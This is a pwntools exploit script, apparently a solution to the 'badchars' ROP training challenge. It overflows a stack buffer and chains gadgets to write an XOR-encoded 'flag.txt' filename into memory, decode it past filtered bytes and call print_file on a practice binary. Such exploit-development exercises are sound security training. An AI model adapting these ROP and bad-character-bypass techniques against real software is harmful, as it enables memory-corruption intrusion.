#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template badchars
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'badchars')

context.terminal = ["tmux", "splitw", "-h"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *(&pwnme+261)
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

buffer_dim = 32
offset = buffer_dim + 8

print_file = exe.symbols['print_file']

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]
pop_r12_pop_r13_pop_r14_pop_r15 = rop.find_gadget(['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'])[0]
mov_qword_ptr_r13_r12 = 0x400634
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_r14_pop_r15 = rop.find_gadget(['pop r14', 'pop r15'])[0]

string_address = 0x601038
xor_byte = 0x20

xor_byte_ptr_r15_r14b = 0x400628

filename = 'flag.txt'

xored_string = ''
for c in filename:
    xored_string += chr(ord(c) ^ xor_byte)

payload = [
    b'a' * offset,
    p64(ret),
    p64(pop_r12_pop_r13_pop_r14_pop_r15),
    xored_string.encode(),             # r12
    p64(string_address),               # r13
    p64(xor_byte),                     # r14
    p64(string_address),               # r15
    p64(mov_qword_ptr_r13_r12)
]

# XOR again the filename after pass all checks

for i in range(len(filename)):
    payload += [
        p64(pop_r14_pop_r15),
        p64(xor_byte),
        p64(string_address + i),
        p64(xor_byte_ptr_r15_r14b),
    ]

# Call the print_file with correct filename

payload += [
    p64(pop_rdi),
    p64(string_address),
    p64(print_file)
]

payload = b''.join(payload)

io.info(f"Payload chars: {payload}")

io.sendlineafter(b'> ', payload)

io.interactive()

